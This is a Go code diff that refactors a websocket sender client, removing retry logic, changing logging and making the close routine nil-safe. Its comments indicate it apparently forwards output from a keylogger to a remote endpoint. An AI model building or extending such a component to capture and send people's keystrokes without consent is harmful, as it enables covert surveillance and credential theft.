@@ -14,9 +14,6 @@ type Sender struct {
 	origin_endpoint string
 	url_ws          string
 	ws              *websocket.Conn
-	max_retries     int64
-	retry_duration  time.Duration
-	isClosed        bool
 	reader          chan bool
 	writer          chan []byte
 	done            chan struct{}
@@ -36,9 +33,6 @@ func MustGetNewSender(origin, apikey string) *Sender {
 		origin_endpoint: origin,
 		url_ws:          url_ws,
 		ws:              nil,
-		max_retries:     10000,
-		retry_duration:  1 * time.Second,
-		isClosed:        false,
 		reader:          make(chan bool),
 		writer:          make(chan []byte),
 		done:            nil,
@@ -63,20 +57,16 @@ func (s *Sender) connectWS() error {
 	}()
 	go s.read()
 	s.write()
-	slog.Info("Client finished connection")
+	slog.Info("Client end of connection")
 	return nil
 }
 
 func (s *Sender) handleReconnects() {
 	if s.ws == nil {
 		// blocking call to start reading keylogger
-		// s.isClosed = false
 		s.connectWS()
-		// s.isClosed = true
 		time.Sleep(1 * time.Second)
-		// d.keylogger.Close()
 	}
-
 	s.handleReconnects()
 }
 
@@ -122,12 +112,12 @@ func (s *Sender) read() {
 				websocket.CloseGoingAway,
 				websocket.CloseAbnormalClosure,
 			) {
-				fmt.Printf("Unexpected close error: %v\n", err)
+				slog.Error(fmt.Sprintf("Unexpected close error: %s\n", err.Error()))
 			}
 			slog.Error(fmt.Sprintf("sender:read: %s\n", err.Error()))
 			return
 		}
-		log.Printf("recv: %s", msg)
+		slog.Info(fmt.Sprintf("received message: %s", msg))
 	}
 }
 
@@ -136,29 +126,11 @@ func (s *Sender) Send(p []byte) error {
 	return nil
 }
 
-func (s *Sender) reconnect() error {
-	for i := range s.max_retries {
-		slog.Info("Waiting for reconnecting...")
-		time.Sleep(s.retry_duration)
-		err := s.connectWS()
-		if err != nil {
-			continue
-		}
-		// ws_reconnect, _, err := websocket.DefaultDialer.Dial(s.url_ws, nil)
-		// if err != nil {
-		// 	continue
-		// }
-		slog.Info(fmt.Sprintf("Reconnected after %d retries\n", i+1))
-		// s.isClosed = false
-		// s.ws = ws_reconnect
-		return nil
-	}
-	return fmt.Errorf("Maximum retries excedeed\n")
-}
-
 func (s *Sender) Close() error {
 	close(s.reader)
 	close(s.writer)
-	// close(s.done)
-	return s.ws.Close()
+	if s.ws != nil {
+		s.ws.Close()
+	}
+	return nil
 }
